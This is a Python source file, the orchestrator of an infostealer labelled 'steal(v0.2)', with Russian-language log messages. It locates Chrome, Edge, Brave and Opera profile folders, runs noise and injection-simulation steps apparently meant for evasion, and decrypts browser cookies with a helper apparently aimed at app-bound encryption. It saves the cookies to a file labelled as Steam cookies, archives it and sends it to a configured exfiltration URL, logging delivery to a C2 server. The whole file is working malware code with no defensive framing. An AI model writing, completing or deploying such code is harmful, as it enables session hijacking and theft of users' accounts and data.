import os
import time

from core.config import jitter, CONFIG, get_output_path
from modules.noise import generate_noise
from modules.pseudo_injector import simulate_injection
from modules.chrome_decryptor import decrypt_chrome_cookies
from modules.packer import pack
from net.exfil_async import send_async
from modules.app_bound_helper import run_chromelevator


BROWSERS = {
    "Chrome": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data"),
    "Edge": os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data"),
    "Brave": os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data"),
    "Opera": os.path.expanduser(r"~\AppData\Roaming\Opera Software\Opera Stable"),
}


def execute_full_steal(log_callback=None, use_exfil=True):
    if log_callback:
        log_callback("[*] steal(v0.2) — запуск оркестратора...")

    generate_noise()
    if log_callback:
        log_callback(f"[*] {simulate_injection()}")

    all_results = []

    for browser_name, base_path in BROWSERS.items():
        if not os.path.exists(base_path):
            continue
        if log_callback:
            log_callback(f"[+] Сканирую {browser_name}...")

        results = decrypt_chrome_cookies(browser_name, base_path, log_callback)
        all_results.extend(results)

    run_chromelevator(log_callback)

    if all_results:
        save_path = get_output_path("steam_cookies_encrypted.txt")

        with open(save_path, "w", encoding="utf-8") as f:
            f.write("=== steal(v0.2) — ENCRYPTED STEAM COOKIES ===\n")
            f.write(f"Дата: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Всего найдено: {len(all_results)}\n")
            f.write("=" * 80 + "\n\n")

            for r in all_results:
                f.write(f"Браузер : {r['browser']} ({r['profile']})\n")
                f.write(f"Host    : {r['host']}\n")
                f.write(f"Cookie  : {r['cookie']}\n")
                f.write(f"Encrypted (base64): {r['encrypted_value']}\n")
                f.write("-" * 70 + "\n\n")

        if log_callback:
            log_callback(f"[+] Зашифрованные куки сохранены:")
            log_callback(f"    → {save_path}")
            log_callback(f"    → Найдено: {len(all_results)} куки")

        archive = pack([save_path], get_output_path(CONFIG["archive_name"]))
        if archive and use_exfil:
            send_async(archive, CONFIG["exfil_url"])
            if log_callback:
                log_callback("[+] Архив отправлен на C2")

    else:
        if log_callback:
            log_callback("[!] Куки не найдены.")

    time.sleep(jitter())
    if log_callback:
        log_callback("[*] Оркестратор завершил работу.")